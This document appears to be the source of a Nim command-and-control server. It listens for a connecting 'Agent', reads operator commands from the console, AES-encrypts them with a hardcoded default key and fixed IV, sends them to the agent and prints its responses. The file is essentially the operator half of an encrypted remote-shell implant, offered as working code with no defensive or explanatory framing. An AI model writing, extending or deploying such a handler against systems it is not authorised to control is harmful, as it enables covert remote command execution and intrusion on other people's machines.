import net
import std/parseopt
import parseutils
import aesCrypto
import nimcrypto
import nimcrypto/sysrand




# default variables and procs that could be modified from cmd arguments (if needed /desired)
var portNum: int = 5454
var passedKey: string = "My Passkey"
var passedIV: string = "1234567890ABCDEF"
proc writeHelp() = discard
proc writeVersion() = discard

# CLI Arguments for the Server
#  in nim argument values must be passed with = or :
for kind, key, value in getopt():  

  case kind
  of cmdArgument:
    # echo "Got arg with key: ", key
    discard #(should discard this iteration of the loop and move to the next one)

  # cmdLongOption, cmdShortOption: 
  of cmdLongOption, cmdShortOption:
    case key
    # -p is to specify port number as in -p=443 or -p:443 but not -p 443
    of "p", "port":
      # echo "Got arg 'p' with value: ", value
      # change the port value string, to an int & store in portNum variable defined above
      discard parseInt(value, portNum, 0) 
    of "h", "help":
      writeHelp()
    of "v", "version":
      writeVersion()
    of "e", "encryption-key":
      echo "Got encryption-key with value: ", value
      passedKey = value


# Setting up the server params
let server: Socket = newSocket()
server.bindAddr(Port(portNum))

# Starting Server
server.listen()
echo "Server: started. Listening to new connections on port ", portNum, " ... "

var client: Socket = new(Socket)
server.accept(client)
stdout.writeLine("Server: client connected")

while true:
  stdout.write("> ")
  let command: string = stdin.readLine()

  let encCommand = encryptStr(command, passedKey, passedIV)
  
  
  client.send(encCommand & "\n")
  let response: string = client.recvLine()
  echo "Server: Agent's Response: ", response


server.close()
stdout.writeLine("Server: closed.")

var consoleInput = readLine(stdin);
